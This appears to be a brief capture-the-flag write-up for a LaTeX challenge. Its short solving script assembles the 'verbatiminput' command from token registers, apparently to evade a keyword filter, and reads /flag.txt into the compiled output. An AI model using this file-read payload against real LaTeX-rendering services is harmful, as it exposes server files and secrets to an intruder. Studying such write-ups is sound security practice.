# Latex
In this challenge, you can use "\the" to store a string and use "\begin" and "\end" to build an expression using the string you stored with "\the". Here's the solving script in LaTeX:

```latex
\documentclass{article}
\RequirePackage{verbatim}
\begin{document}
\newtoks\in
\newtoks\put
\in={in}
\put={put}
\begin{verbatim\the\in\the\put}{/flag.txt}\end{verbatim\the\in\the\put}
\end{document}
```
